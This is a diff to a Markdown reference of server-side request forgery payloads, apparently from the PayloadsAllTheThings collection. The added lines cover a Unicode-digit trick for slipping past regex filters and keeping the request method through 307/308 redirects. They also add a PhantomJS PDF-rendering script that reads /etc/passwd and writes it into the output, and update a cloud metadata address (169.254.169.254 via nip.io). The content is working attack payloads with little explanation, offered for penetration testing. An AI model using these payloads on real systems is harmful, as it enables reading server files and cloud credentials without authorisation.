@@ -223,6 +223,12 @@ List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
 
+### Bypass using unicode
+
+In some languages (.NET, Python 3) regex supports unicode by default.
+`\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.
+
+
 ### Bypass filter_var() php function
 
 ```powershell
@@ -249,6 +255,7 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
 2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
 vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.
 ```
 
 ### Bypassing using type=url
@@ -450,12 +457,24 @@ gopher://127.0.0.1:6379/_save
 
 ## SSRF exploiting PDF file
 
-![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.jpg?raw=true)
+![https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png)
 
 Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
 
 ```powershell
 <link rel=attachment href="file:///root/secret.txt">
+```
+
+Example with PhantomJS 
+
+```js
+<script>
+    exfil = new XMLHttpRequest();
+    exfil.open("GET","file:///etc/passwd");
+    exfil.send();
+    exfil.onload = function(){document.write(this.responseText);}
+    exfil.onerror = function(){document.write('failed!')}
+</script>
 ```
 
 ## Blind SSRF
@@ -540,9 +559,7 @@ DNS record
 ```powershell
 http://instance-data
 http://169.254.169.254
-http://169.254.169.254.xip.io/
-http://1ynrnhl.xip.io/
-http://www.owasp.org.1ynrnhl.xip.io/
+http://169.254.169.254.nip.io/
 ```
 
 HTTP redirect
